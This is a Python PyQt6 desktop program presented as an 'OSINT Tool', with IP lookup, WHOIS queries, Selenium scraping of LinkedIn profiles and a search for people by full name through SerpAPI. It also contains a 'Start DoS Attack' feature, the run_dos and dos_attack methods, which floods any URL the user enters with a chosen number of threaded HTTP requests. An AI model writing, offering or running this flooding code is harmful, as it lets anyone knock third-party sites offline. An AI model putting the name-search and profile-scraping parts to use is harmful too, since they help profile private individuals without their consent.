import sys
import requests
import threading
import whois
from PyQt6.QtWidgets import (QApplication, QWidget, QVBoxLayout, QLabel, QLineEdit, QPushButton, QTextEdit, QMessageBox)
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.service import Service
from webdriver_manager.chrome import ChromeDriverManager

class OSINTTool(QWidget):
    def __init__(self):
        super().__init__()
        self.initUI()
    
    def initUI(self):
        self.setWindowTitle("OSINT Tool")
        self.setGeometry(100, 100, 600, 500)
        layout = QVBoxLayout()
        
        
        self.label = QLabel("Enter IP, Domain, or Profile URL:")
        layout.addWidget(self.label)
        self.entry = QLineEdit()
        layout.addWidget(self.entry)
        self.run_button = QPushButton("Run OSINT")
        self.run_button.clicked.connect(self.run_osint)
        layout.addWidget(self.run_button)
        
        
        self.label_dos = QLabel("Enter URL for DoS Attack:")
        layout.addWidget(self.label_dos)
        self.dos_entry = QLineEdit()
        layout.addWidget(self.dos_entry)
        self.label_num_requests = QLabel("Number of Requests for DoS Attack:")
        layout.addWidget(self.label_num_requests)
        self.num_requests_entry = QLineEdit()
        layout.addWidget(self.num_requests_entry)
        self.dos_button = QPushButton("Start DoS Attack")
        self.dos_button.clicked.connect(self.run_dos)
        layout.addWidget(self.dos_button)
        
        
        self.name_label = QLabel("Nom et prénom de la personne:")
        layout.addWidget(self.name_label)
        self.name_entry = QLineEdit()
        layout.addWidget(self.name_entry)
        self.search_button = QPushButton("Rechercher")
        self.search_button.clicked.connect(self.search_person)
        layout.addWidget(self.search_button)
        
        # Zone d'affichage des résultats
        self.result_text = QTextEdit()
        layout.addWidget(self.result_text)
        
        self.setLayout(layout)
    
    def run_osint(self):
        input_value = self.entry.text().strip()
        if not input_value:
            QMessageBox.critical(self, "Error", "Please enter a valid IP, domain, or profile URL")
            return
        
        if input_value.replace('.', '').isdigit():
            info = self.get_ip_info(input_value)
            self.display_result(f"IP Info:\n{info}\n")
        elif '.' in input_value:
            info = self.whois_info(input_value)
            self.display_result(f"WHOIS Info:\n{info}\n")
        elif input_value.startswith('http'):
            profile_data = self.scrape_linkedin(input_value)
            self.display_result(f"LinkedIn Profile:\nName: {profile_data['Name']}\nHeadline: {profile_data['Headline']}\n")
    
    def get_ip_info(self, ip):
        url = f"https://ipinfo.io/{ip}/json"
        response = requests.get(url)
        return response.json()
    
    def whois_info(self, domain):
        return whois.whois(domain)
    
    def scrape_linkedin(self, profile_url):
        driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()))
        driver.get(profile_url)
        
        try:
            name = driver.find_element(By.XPATH, "//h1").text
            headline = driver.find_element(By.XPATH, "//div[@class='text-body-medium']").text
        except Exception:
            name, headline = "Error", "Could not fetch details"
        
        driver.quit()
        return {"Name": name, "Headline": headline}
    
    def run_dos(self):
        url = self.dos_entry.text().strip()
        if not url:
            QMessageBox.critical(self, "Error", "Please enter a URL for the DoS attack")
            return
        try:
            num_requests = int(self.num_requests_entry.text().strip())
        except ValueError:
            QMessageBox.critical(self, "Error", "Invalid number of requests")
            return
        
        self.display_result(f"Starting DoS attack on {url} with {num_requests} requests...\n")
        self.dos_attack(url, num_requests)
    
    def dos_attack(self, url, num_requests=100):
        def send_request():
            try:
                response = requests.get(url)
                print(f"Request sent to {url}, Status code: {response.status_code}")
            except requests.exceptions.RequestException as e:
                print(f"Error: {e}")
        
        threads = []
        for _ in range(num_requests):
            thread = threading.Thread(target=send_request)
            thread.start()
            threads.append(thread)
        
        for thread in threads:
            thread.join()
    
    def search_person_by_name(self, name):
        api_key = "put your own api key here,serp api provide a free subscription :)"
        url = f"https://serpapi.com/search?q={name}&api_key={api_key}"
        response = requests.get(url)
        return response.json().get('organic_results', []) if response.status_code == 200 else []
    
    def search_person(self):
        name = self.name_entry.text().strip()
        if not name:
            QMessageBox.critical(self, "Error", "Please enter a valid name")
            return
        results = self.search_person_by_name(name)
        self.display_search_results(results)
    
    def display_search_results(self, results):
        if results:
            text = "Person Search Results:\n" + "\n".join([f"Titre: {res.get('title')}\nURL: {res.get('link')}\n" for res in results])
        else:
            text = "Aucun résultat trouvé."
        self.display_result(text)
    
    def display_result(self, text):
        self.result_text.clear()
        self.result_text.setPlainText(text)

if __name__ == '__main__':
    app = QApplication(sys.argv)
    window = OSINTTool()
    window.show()
    sys.exit(app.exec())
